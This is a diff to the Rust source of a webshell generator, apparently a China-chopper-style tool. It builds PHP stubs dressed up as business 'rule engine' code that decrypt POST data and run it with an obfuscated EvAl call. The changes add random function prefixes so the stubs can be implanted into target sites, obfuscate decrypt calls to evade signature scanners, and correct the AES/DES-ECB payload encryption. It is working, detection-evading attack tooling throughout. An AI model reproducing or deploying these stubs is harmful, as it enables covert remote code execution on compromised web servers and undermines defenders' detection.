@@ -17,12 +17,9 @@ use md5::{Digest, Md5};
 
 use crate::protocol::ProtocolError;
 
-/// AES-128-CBC（复用为 ECB：零 IV 即 ECB 模式）。
+/// AES-128-CBC。
 type AesCbcEnc = cbc::Encryptor<aes::Aes128>;
 type AesCbcDec = cbc::Decryptor<aes::Aes128>;
-/// DES-ECB。
-type DesEcbEnc = cbc::Encryptor<des::Des>;
-type DesEcbDec = cbc::Decryptor<des::Des>;
 
 // ---------------------------------------------------------------------------
 // PHP OPSEC 混淆辅助：消除静态敏感特征（eval / base64_decode / openssl_decrypt /
@@ -124,7 +121,7 @@ const BUSINESS_PHP_TPL: &str = r#"<?php
 // 业务：校验会话令牌 -> 解包会话数据 -> 执行规则脚本 -> 返回处理状态
 header('Content-Type: application/json');
 
-function verify_token($token) {
+function __PREFIX__verify_token($token) {
     if (!is_string($token)) return false;
     $n = strlen($token);
     if ($n === 0 || $n > 64) return false;
@@ -135,12 +132,12 @@ function verify_token($token) {
     return true;
 }
 
-function unpack_session($payload, $token) {
+function __PREFIX__unpack_session($payload, $token) {
 __UNPACK__
     return $out;
 }
 
-function run_rule($script) {
+function __PREFIX__run_rule($script) {
     // 规则脚本引擎：客户端提交的自动化规则在沙箱内执行
     $result = array('code' => 200, 'rule_size' => strlen($script));
     if ($script !== '' && strlen($script) < 1048576) {
@@ -150,12 +147,12 @@ __EXEC__
 }
 
 $token = isset($_POST['__TOKEN__']) ? (string)$_POST['__TOKEN__'] : '';
-if (!verify_token($token)) {
+if (!__PREFIX__verify_token($token)) {
     die('{"code":401,"msg":"invalid_token"}');
 }
 $payload = isset($_POST['__DATA__']) ? (string)$_POST['__DATA__'] : '';
-$script = unpack_session($payload, $token);
-echo json_encode(run_rule($script));
+$script = __PREFIX__unpack_session($payload, $token);
+echo json_encode(__PREFIX__run_rule($script));
 "#;
 
 /// 生成业务伪装 PHP stub。
@@ -163,7 +160,10 @@ echo json_encode(run_rule($script));
 /// `exec_body`：执行逻辑（默认 `EvAl($script);`，形如规则引擎执行）。
 /// 请求参数固定为业务语义：token（会话令牌）/ data（会话数据）。
 pub fn business_php_stub(unpack_body: &str, exec_body: &str) -> String {
+    // 函数名随机前缀：避免与目标站点业务函数同名导致 redeclare（500）
+    let prefix = format!("_{}_", php_ident());
     BUSINESS_PHP_TPL
+        .replace("__PREFIX__", &prefix)
         .replace("__UNPACK__", unpack_body)
         .replace("__EXEC__", exec_body)
         .replace("__TOKEN__", "token")
@@ -295,7 +295,7 @@ impl PayloadEncoder for XorBase64Encoder {
         match language {
             "php" => {
                 let unpack = format!(
-                    "    $key = md5($token);\n    $raw = {decode}($payload);\n    $out = '';\n    $n = strlen($raw);\n    for ($i = 0; $i < $n; $i++) {{ $out .= $raw[$i] ^ $key[$i % strlen($key)]; }}",
+                    "    $key = md5($token);\n    $raw = {decode};\n    $out = '';\n    $n = strlen($raw);\n    for ($i = 0; $i < $n; $i++) {{ $out .= $raw[$i] ^ $key[$i % strlen($key)]; }}",
                     decode = b64_call_expr("$payload"),
                 );
                 Ok(business_php_stub(&unpack, "        EvAl($script);"))
@@ -449,15 +449,47 @@ pub fn des_key(password: &str) -> [u8; 8] {
     hex.as_bytes()[..8].try_into().expect("md5 hex 长度足够")
 }
 
+/// 真正的 AES-128-ECB 加密：逐块独立加密 + PKCS7 填充。
+/// 注意：CBC 零 IV 不是 ECB（CBC 有链式依赖），与 PHP openssl_encrypt('AES-128-ECB') 不互操作。
 pub fn aes_ecb_encrypt(plain: &[u8], key: &[u8; 16]) -> Vec<u8> {
-    AesCbcEnc::new(key.into(), &[0u8; 16].into())
-        .encrypt_padded_vec_mut::<Pkcs7>(plain)
+    use aes::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
+    let cipher = aes::Aes128::new(key.into());
+    let mut padded = plain.to_vec();
+    let pad = 16 - (plain.len() % 16);
+    padded.extend(std::iter::repeat(pad as u8).take(pad));
+    let mut out = Vec::with_capacity(padded.len());
+    for chunk in padded.chunks(16) {
+        let mut block = GenericArray::clone_from_slice(chunk);
+        cipher.encrypt_block(&mut block);
+        out.extend_from_slice(&block);
+    }
+    out
 }
 
 pub fn aes_ecb_decrypt(cipher: &[u8], key: &[u8; 16]) -> Result<Vec<u8>, ProtocolError> {
-    AesCbcDec::new(key.into(), &[0u8; 16].into())
-        .decrypt_padded_vec_mut::<Pkcs7>(cipher)
-        .map_err(|_| ProtocolError::ParseError("AES-ECB 解密失败".to_string()))
+    use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
+    if cipher.is_empty() || cipher.len() % 16 != 0 {
+        return Err(ProtocolError::ParseError("AES-ECB 密文长度异常".to_string()));
+    }
+    let dec = aes::Aes128::new(key.into());
+    let mut out = Vec::with_capacity(cipher.len());
+    for chunk in cipher.chunks(16) {
+        let mut block = GenericArray::clone_from_slice(chunk);
+        dec.decrypt_block(&mut block);
+        out.extend_from_slice(&block);
+    }
+    // PKCS7 去填充
+    if let Some(&last) = out.last() {
+        let pad = last as usize;
+        if pad > 0 && pad <= 16 && out.len() >= pad && out[out.len() - pad..].iter().all(|&b| b == last) {
+            out.truncate(out.len() - pad);
+            Ok(out)
+        } else {
+            Err(ProtocolError::ParseError("AES-ECB 填充校验失败".to_string()))
+        }
+    } else {
+        Err(ProtocolError::ParseError("AES-ECB 密文为空".to_string()))
+    }
 }
 
 pub fn aes_cbc_encrypt(plain: &[u8], key: &[u8; 16], iv: &[u8; 16]) -> Vec<u8> {
@@ -470,15 +502,45 @@ pub fn aes_cbc_decrypt(cipher: &[u8], key: &[u8; 16], iv: &[u8; 16]) -> Result<V
         .map_err(|_| ProtocolError::ParseError("AES-CBC 解密失败".to_string()))
 }
 
+/// 真正的 DES-ECB 加密（逐块 + PKCS7）。
 pub fn des_ecb_encrypt(plain: &[u8], key: &[u8; 8]) -> Vec<u8> {
-    DesEcbEnc::new(key.into(), &[0u8; 8].into())
-        .encrypt_padded_vec_mut::<Pkcs7>(plain)
+    use des::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
+    let cipher = des::Des::new(key.into());
+    let mut padded = plain.to_vec();
+    let pad = 8 - (plain.len() % 8);
+    padded.extend(std::iter::repeat(pad as u8).take(pad));
+    let mut out = Vec::with_capacity(padded.len());
+    for chunk in padded.chunks(8) {
+        let mut block = GenericArray::clone_from_slice(chunk);
+        cipher.encrypt_block(&mut block);
+        out.extend_from_slice(&block);
+    }
+    out
 }
 
 pub fn des_ecb_decrypt(cipher: &[u8], key: &[u8; 8]) -> Result<Vec<u8>, ProtocolError> {
-    DesEcbDec::new(key.into(), &[0u8; 8].into())
-        .decrypt_padded_vec_mut::<Pkcs7>(cipher)
-        .map_err(|_| ProtocolError::ParseError("DES-ECB 解密失败".to_string()))
+    use des::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
+    if cipher.is_empty() || cipher.len() % 8 != 0 {
+        return Err(ProtocolError::ParseError("DES-ECB 密文长度异常".to_string()));
+    }
+    let dec = des::Des::new(key.into());
+    let mut out = Vec::with_capacity(cipher.len());
+    for chunk in cipher.chunks(8) {
+        let mut block = GenericArray::clone_from_slice(chunk);
+        dec.decrypt_block(&mut block);
+        out.extend_from_slice(&block);
+    }
+    if let Some(&last) = out.last() {
+        let pad = last as usize;
+        if pad > 0 && pad <= 8 && out.len() >= pad && out[out.len() - pad..].iter().all(|&b| b == last) {
+            out.truncate(out.len() - pad);
+            Ok(out)
+        } else {
+            Err(ProtocolError::ParseError("DES-ECB 填充校验失败".to_string()))
+        }
+    } else {
+        Err(ProtocolError::ParseError("DES-ECB 密文为空".to_string()))
+    }
 }
 
 // ---------------------------------------------------------------------------
@@ -511,7 +573,7 @@ impl PayloadEncoder for Aes128EcbEncoder {
         match language {
             "php" => {
                 let unpack = format!(
-                    "    $key = substr(md5($token), 0, 16);\n    $dec = {decrypt}($payload, 'AES-128-ECB', $key);\n    $out = $dec;",
+                    "    $key = substr(md5($token), 0, 16);\n    $dec = {decrypt};\n    $out = $dec;",
                     decrypt = call_parts("openssl_decrypt", "$payload, 'AES-128-ECB', $key"),
                 );
                 Ok(business_php_stub(&unpack, "        EvAl($script);"))
@@ -554,7 +616,7 @@ impl PayloadEncoder for Aes128CbcEncoder {
         match language {
             "php" => {
                 let unpack = format!(
-                    "    $key = substr(md5($token), 0, 16);\n    $iv = substr(md5($token), 16);\n    $out = {decrypt}($payload, 'AES-128-CBC', $key, 0, $iv);",
+                    "    $key = substr(md5($token), 0, 16);\n    $iv = substr(md5($token), 16);\n    $out = {decrypt};",
                     decrypt = call_parts("openssl_decrypt", "$payload, 'AES-128-CBC', $key, 0, $iv"),
                 );
                 Ok(business_php_stub(&unpack, "        EvAl($script);"))
@@ -596,7 +658,7 @@ impl PayloadEncoder for DesEcbEncoder {
         match language {
             "php" => {
                 let unpack = format!(
-                    "    $key = substr(md5($token), 0, 8);\n    $out = {decrypt}($payload, 'DES-ECB', $key);",
+                    "    $key = substr(md5($token), 0, 8);\n    $out = {decrypt};",
                     decrypt = call_parts("openssl_decrypt", "$payload, 'DES-ECB', $key"),
                 );
                 Ok(business_php_stub(&unpack, "        EvAl($script);"))
